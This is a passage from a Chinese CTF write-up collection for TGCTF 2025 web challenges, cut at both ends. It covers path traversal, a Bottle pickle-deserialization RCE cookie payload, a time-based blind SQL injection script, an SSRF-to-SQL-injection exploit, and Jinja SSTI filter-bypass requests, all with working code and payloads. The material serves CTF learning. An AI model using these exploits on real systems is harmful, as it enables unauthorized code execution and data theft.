PATHINFO_EXTENSION\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!in_array\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file_ext\u003c/span\u003e, \u003cspan class=\"nv\"\u003e$deny_ext\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$temp_file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;tmp_name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$file_content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e file_get_contents\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$temp_file\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003epreg_match\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/.+?\u0026lt;/s\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003e$file_content\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;文件内容包含非法字符，禁止上传！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 403\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e403\u003c/span\u003e 表示禁止访问\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$img_path\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e UPLOAD_PATH . \u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emove_uploaded_file\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$temp_file\u003c/span\u003e, \u003cspan class=\"nv\"\u003e$img_path\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$is_upload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;文件上传成功！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;上传出错！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 500\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e500\u003c/span\u003e 表示服务器内部错误\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e32\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e33\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e34\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e35\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;禁止保存为该类型文件！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e36\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 403\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e403\u003c/span\u003e 表示禁止访问\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e37\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e38\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e39\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e UPLOAD_PATH . \u003cspan class=\"s1\"\u003e\u0026#39;文件夹不存在,请手工创建！\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e40\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 404\u003cspan class=\"p\"\u003e;\u003c/span\u003e // \u003cspan class=\"m\"\u003e404\u003c/span\u003e 表示资源未找到\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e41\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e42\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e43\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e44\u003c/span\u003e\u003cspan class=\"cl\"\u003e// 设置 HTTP 状态码\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e45\u003c/span\u003e\u003cspan class=\"cl\"\u003ehttp_response_code\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e46\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e47\u003c/span\u003e\u003cspan class=\"cl\"\u003e// 输出结果\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e48\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e json_encode\u003cspan class=\"o\"\u003e([\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e49\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;status_code\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e50\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;msg\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e51\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e审计一下代码，看到有个name，可以对文件名进行修改，想到目录穿越\u003c/p\u003e","title":"TGCTF-2025-Web-Writeup"},{"content":"Web Signin 题目\n1# -*- encoding: utf-8 -*- 2\u0026#39;\u0026#39;\u0026#39; 3@File : main.py 4@Time : 2025/03/28 22:20:49 5@Author : LamentXU 6\u0026#39;\u0026#39;\u0026#39; 7\u0026#39;\u0026#39;\u0026#39; 8flag in /flag_{uuid4} 9\u0026#39;\u0026#39;\u0026#39; 10from bottle import Bottle, request, response, redirect, static_file, run, route 11with open(\u0026#39;../../secret.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: 12 secret = f.read() 13 14app = Bottle() 15@route(\u0026#39;/\u0026#39;) 16def index(): 17 return \u0026#39;\u0026#39;\u0026#39;HI\u0026#39;\u0026#39;\u0026#39; 18@route(\u0026#39;/download\u0026#39;) 19def download(): 20 name = request.query.filename 21 if \u0026#39;../../\u0026#39; in name or name.startswith(\u0026#39;/\u0026#39;) or name.startswith(\u0026#39;../\u0026#39;) or \u0026#39;\\\\\u0026#39; in name: 22 response.status = 403 23 return \u0026#39;Forbidden\u0026#39; 24 with open(name, \u0026#39;rb\u0026#39;) as f: 25 data = f.read() 26 return data 27 28@route(\u0026#39;/secret\u0026#39;) 29def secret_page(): 30 try: 31 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=secret) 32 if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: 33 session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} 34 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=secret) 35 return \u0026#39;Forbidden!\u0026#39; 36 if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 37 return \u0026#39;The secret has been deleted!\u0026#39; 38 except: 39 return \u0026#34;Error!\u0026#34; 40run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080, debug=False) 目录穿越拿secret\n1./.././../secret.txt 1Hell0_H@cker_Y0u_A3r_Sm@r7 看到get_cookie打pickle反序列化(get_cookie中会进行pickle反序列化)\n1from bottle import cookie_encode 2import os 3 4secret = \u0026#34;Hell0_H@cker_Y0u_A3r_Sm@r7\u0026#34; 5 6class Name: 7 def __reduce__(self): 8 return (eval, (\u0026#34;\u0026#34;\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;calc\u0026#39;).read()\u0026#34;\u0026#34;\u0026#34;,)) 9 10exp = cookie_encode((\u0026#39;session\u0026#39;,{\u0026#34;name\u0026#34;: [Name()]}),secret) 11print(exp) ‍\nezsql(手动滑稽) 这题大概fuzz一下可以发现username处waf很多\n1, 2- 3= 4| 5* 6\u0026amp; 7空格 8order by 9like 10handler 11and 12union 在password处会对单双引号进行转义\n那我们只需要想办法构造闭合然后打时间盲注，由于会对单引号进行转义，我这里用的无列名注入\n1import requests 2 3url = \u0026#34;xxxxx\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 head = 32 10 tail = 127 11 while head \u0026lt; tail: 12 mid = (head + tail) \u0026gt;\u0026gt; 1 13 # 查表名 14 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 15 # 无列名注入 16 # payload = \u0026#34;select b from (select 1 as b,2 union select * from user limit 1,1)xrntkk\u0026#34; 17 payload = \u0026#34;select b from (select 1 as b union select * from double_check limit 1,1)xrntkk\u0026#34; 18 19 20 data = { 21 \u0026#39;username\u0026#39;: \u0026#34;1\u0026#39;or\\t1=\u0026#34;, 22 \u0026#39;password\u0026#39;: f\u0026#39;or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#39; 23 } 24 try: 25 r = requests.post(url, data=data, timeout=1) 26 print(r.text) 27 tail = mid 28 except requests.exceptions.Timeout: 29 head = mid + 1 30 except Exception as e: 31 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 32 break 33 34 if head != 32: 35 result += chr(head) 36 else: 37 break 38 print(\u0026#34;[*]Result : \u0026#34;+result) 可以拿到key\n1[*]Result : dtfrtkcc0czkoua9S 在doublecheck.php中输入拿到的key后，会跳转到index.php，可以进行命令执行但是无回显\n1cat%09/flag.txt\u0026gt;/var/www/html/flag ‍\nFate 源码\n1#!/usr/bin/env python3 2import flask 3import sqlite3 4import requests 5import string 6import json 7app = flask.Flask(__name__) 8blacklist = string.ascii_letters 9def binary_to_string(binary_string): 10 if len(binary_string) % 8 != 0: 11 raise ValueError(\u0026#34;Binary string length must be a multiple of 8\u0026#34;) 12 binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)] 13 string_output = \u0026#39;\u0026#39;.join(chr(int(chunk, 2)) for chunk in binary_chunks) 14 15 return string_output 16 17@app.route(\u0026#39;/proxy\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 18def nolettersproxy(): 19 url = flask.request.args.get(\u0026#39;url\u0026#39;) 20 if not url: 21 return flask.abort(400, \u0026#39;No URL provided\u0026#39;) 22 23 target_url = \u0026#34;http://lamentxu.top\u0026#34; + url 24 for i in blacklist: 25 if i in url: 26 return flask.abort(403, \u0026#39;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~\u0026#39;) 27 if \u0026#34;.\u0026#34; in url: 28 return flask.abort(403, \u0026#39;No ssrf allowed\u0026#39;) 29 response = requests.get(target_url) 30 31 return flask.Response(response.content, response.status_code) 32def db_search(code): 33 with sqlite3.connect(\u0026#39;database.db\u0026#39;) as conn: 34 cur = conn.cursor() 35 cur.execute(f\u0026#34;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(\u0026#39;{code}\u0026#39;)))))))\u0026#34;) 36 found = cur.fetchone() 37 return None if found is None else found[0] 38 39@app.route(\u0026#39;/\u0026#39;) 40def index(): 41 print(flask.request.remote_addr) 42 return flask.render_template(\u0026#34;index.html\u0026#34;) 43 44@app.route(\u0026#39;/1337\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 45def api_search(): 46 if flask.request.remote_addr == \u0026#39;127.0.0.1\u0026#39;: 47 code = flask.request.args.get(\u0026#39;0\u0026#39;) 48 if code == \u0026#39;abcdefghi\u0026#39;: 49 print(\u0026#39;0 win!\u0026#39;) 50 req = flask.request.args.get(\u0026#39;1\u0026#39;) 51 try: 52 req = binary_to_string(req) 53 print(req) 54 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) 55 except: 56 flask.abort(400, \u0026#34;Invalid JSON\u0026#34;) 57 if \u0026#39;name\u0026#39; not in req: 58 flask.abort(400, \u0026#34;Empty Person\u0026#39;s name\u0026#34;) 59 60 name = req[\u0026#39;name\u0026#39;] 61 if len(name) \u0026gt; 6: 62 flask.abort(400, \u0026#34;Too long\u0026#34;) 63 if \u0026#39;\\\u0026#39;\u0026#39; in name: 64 flask.abort(400, \u0026#34;NO \u0026#39;\u0026#34;) 65 if \u0026#39;)\u0026#39; in name: 66 flask.abort(400, \u0026#34;NO )\u0026#34;) 67 \u0026#34;\u0026#34;\u0026#34; 68 Some waf hidden here ;) 69 \u0026#34;\u0026#34;\u0026#34; 70 71 fate = db_search(name) 72 if fate is None: 73 flask.abort(404, \u0026#34;No such Person\u0026#34;) 74 75 return {\u0026#39;Fate\u0026#39;: fate} 76 else: 77 flask.abort(400, \u0026#34;Hello local, and hello hacker\u0026#34;) 78 else: 79 flask.abort(403, \u0026#34;Only local access allowed\u0026#34;) 80 81if __name__ == \u0026#39;__main__\u0026#39;: 82 app.run(debug=True) 审计一下源码，看到init_db里面的fake flag，思路大概就是要在/proxy路由ssrf访问/1337路由去sql读flag\n先看proxy，会将传入的url拼接到http://lamentxu.top后面\n这里可用@来绕过\n接着有两个判断，url中不能存在字母和.\n这里用长整型绕过即可\n/proxy?url=@2130706433:8080/1337 接着我们看/1337\n1code = flask.request.args.get(\u0026#39;0\u0026#39;) 2if code == \u0026#39;abcdefghi\u0026#39;: 3 print(\u0026#39;0 win!\u0026#39;) 第一个判断要求传入一串字母，直接传显然过不了/proxy处的判断\n我们这里可以二次编码绕过\n接着往下看\n1req = flask.request.args.get(\u0026#39;1\u0026#39;) 2 try: 3 req = binary_to_string(req) 4 print(req) 5 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) 6 except: 7 flask.abort(400, \u0026#34;Invalid JSON\u0026#34;) 8 if \u0026#39;name\u0026#39; not in req: 9 flask.abort(400, \u0026#34;Empty Person\u0026#39;s name\u0026#34;) 10 11 name = req[\u0026#39;name\u0026#39;] 12 if len(name) \u0026gt; 6: 13 flask.abort(400, \u0026#34;Too long\u0026#34;) 14 if \u0026#39;\\\u0026#39;\u0026#39; in name: 15 flask.abort(400, \u0026#34;NO \u0026#39;\u0026#34;) 16 if \u0026#39;)\u0026#39; in name: 17 flask.abort(400, \u0026#34;NO )\u0026#34;) 18 \u0026#34;\u0026#34;\u0026#34; 19 Some waf hidden here ;) 20 \u0026#34;\u0026#34;\u0026#34; 21 22 fate = db_search(name) 23 if fate is None: 24 flask.abort(404, \u0026#34;No such Person\u0026#34;) 25 26 return {\u0026#39;Fate\u0026#39;: fate} 这里会将传入的内容通过binary_to_string从二进制转换成字符串，接着会解析为json。接着有一连串waf。\n这里我们通过字典绕过，然后构造闭合读flag即可\nexp\n1import requests 2 3#字符串转二进制 4def string_to_binary(input_string): 5 binary_chunks = [bin(ord(char))[2:].zfill(8) for char in input_string] 6 return \u0026#39;\u0026#39;.join(binary_chunks) 7 8url = \u0026#34;xxxxxxx\u0026#34;+\u0026#34;/proxy?url=%40%32%31%33%30%37%30%36%34%33%33%3a%38%30%38%30%2f%31%33%33%37%3f%30%3d%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%26%31%3d\u0026#34; 9payload = string_to_binary(\u0026#34;\u0026#34;\u0026#34;{\u0026#34;name\u0026#34;: {\u0026#34;\u0026#39;))))))) union select FATE from FATETABLE where NAME=\u0026#39;LAMENTXU\u0026#39;--\u0026#34;:666}}\u0026#34;\u0026#34;\u0026#34;) 10# print(payload) 11req = requests.get(url+payload) 12data = req.json() 13print(data[\u0026#39;Fate\u0026#39;]) ‍\n‍\nNow you see me 1 从源代码中找出关键代码\n1# YOU FOUND ME :) 2# -*- encoding: utf-8 -*- 3\u0026#39;\u0026#39;\u0026#39; 4@File : src.py 5@Time : 2025/03/29 01:10:37 6@Author : LamentXU 7\u0026#39;\u0026#39;\u0026#39; 8import flask 9import sys 10 11enable_hook = False 12counter = 0 13 14def audit_checker(event, args): 15 global counter 16 if enable_hook: 17 if event in [\u0026#34;exec\u0026#34;, \u0026#34;compile\u0026#34;]: 18 counter += 1 19 if counter \u0026gt; 4: 20 raise RuntimeError(event) 21 22lock_within = [ 23 \u0026#34;debug\u0026#34;, \u0026#34;form\u0026#34;, \u0026#34;args\u0026#34;, \u0026#34;values\u0026#34;, 24 \u0026#34;headers\u0026#34;, \u0026#34;json\u0026#34;, \u0026#34;stream\u0026#34;, \u0026#34;environ\u0026#34;, 25 \u0026#34;files\u0026#34;, \u0026#34;method\u0026#34;, \u0026#34;cookies\u0026#34;, \u0026#34;application\u0026#34;, 26 \u0026#39;data\u0026#39;, \u0026#39;url\u0026#39; ,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, 27 \u0026#34;getattr\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;{{\u0026#34;, \u0026#34;}}\u0026#34;, 28 \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;/\u0026#34;,\u0026#34;self\u0026#34;, 29 \u0026#34;lipsum\u0026#34;, \u0026#34;cycler\u0026#34;, \u0026#34;joiner\u0026#34;, \u0026#34;namespace\u0026#34;, 30 \u0026#34;init\u0026#34;, \u0026#34;dir\u0026#34;, \u0026#34;join\u0026#34;, \u0026#34;decode\u0026#34;, 31 \u0026#34;batch\u0026#34;, \u0026#34;first\u0026#34;, \u0026#34;last\u0026#34; , 32 \u0026#34; \u0026#34;,\u0026#34;dict\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;g.\u0026#34;, 33 \u0026#34;os\u0026#34;, \u0026#34;subprocess\u0026#34;, 34 \u0026#34;g|a\u0026#34;, \u0026#34;GLOBALS\u0026#34;, \u0026#34;lower\u0026#34;, \u0026#34;upper\u0026#34;, 35 \u0026#34;BUILTINS\u0026#34;, \u0026#34;select\u0026#34;, \u0026#34;WHOAMI\u0026#34;, \u0026#34;path\u0026#34;, 36 \u0026#34;os\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;nl\u0026#34;, \u0026#34;app\u0026#34;, \u0026#34;setattr\u0026#34;, \u0026#34;translate\u0026#34;, 37 \u0026#34;sort\u0026#34;, \u0026#34;base64\u0026#34;, \u0026#34;encode\u0026#34;, \u0026#34;\\\\u\u0026#34;, \u0026#34;pop\u0026#34;, \u0026#34;referer\u0026#34;, 38 \u0026#34;The closer you see, the lesser you find.\u0026#34;] 39 40app = flask.Flask(__name__) 41 42@app.route(\u0026#39;/\u0026#39;) 43def index(): 44 return \u0026#39;try /H3dden_route\u0026#39; 45 46@app.route(\u0026#39;/H3dden_route\u0026#39;) 47def r3al_ins1de_th0ught(): 48 global enable_hook, counter 49 name = flask.request.args.get(\u0026#39;My_ins1de_w0r1d\u0026#39;) 50 if name: 51 try: 52 if name.startswith(\u0026#34;Follow-your-heart-\u0026#34;): 53 for i in lock_within: 54 if i in name: 55 return \u0026#39;NOPE.\u0026#39; 56 enable_hook = True 57 a = flask.render_template_string(\u0026#39;{#{name}#}\u0026#39;) 58 enable_hook = False 59 counter = 0 60 return a 61 else: 62 return \u0026#39;My inside world is always hidden.\u0026#39; 63 except RuntimeError as e: 64 counter = 0 65 return \u0026#39;NO.\u0026#39; 66 except Exception as e: 67 return \u0026#39;Error\u0026#39; 68 else: 69 return \u0026#39;Welcome to Hidden_route!\u0026#39; 70 71if __name__ == \u0026#39;__main__\u0026#39;: 72 import os 73 try: 74 import _posixsubprocess 75 del _posixsubprocess.fork_exec 76 except: 77 pass 78 import subprocess 79 del os.popen 80 del os.system 81 del subprocess.Popen 82 del subprocess.call 83 del subprocess.run 84 del subprocess.check_output 85 del subprocess.getoutput 86 del subprocess.getstatusoutput 87 del subprocess.PIPE 88 del subprocess.STDOUT 89 del subprocess.CalledProcessError 90 del subprocess.TimeoutExpired 91 del subprocess.SubprocessError 92 sys.addaudithook(audit_checker) 93 app.run(debug=False, host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 很明显的 SSTI，我们需要绕过一些过滤，看了一下发现 config 没有被过滤，所以我们可以用它来写入键值。\n通过content-type传参来进行绕过waf\nPayload：\n1{{lipsum.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;)}} 1GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(lip=a|attr(request.mimetype)))%}{%23 HTTP/1.1 2Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 3Content-Type: lipsum 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 5Connection: close 6 7GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(gl=a.lip|attr(request.mimetype)))%}{%23 HTTP/1.1 8Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 9Content-Type: __globals__ 10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 11Connection: close 12 13GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(get=request.mimetype))%}{%23 HTTP/1.1 14Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 15Content-Type: __getitem__ 16Accept: 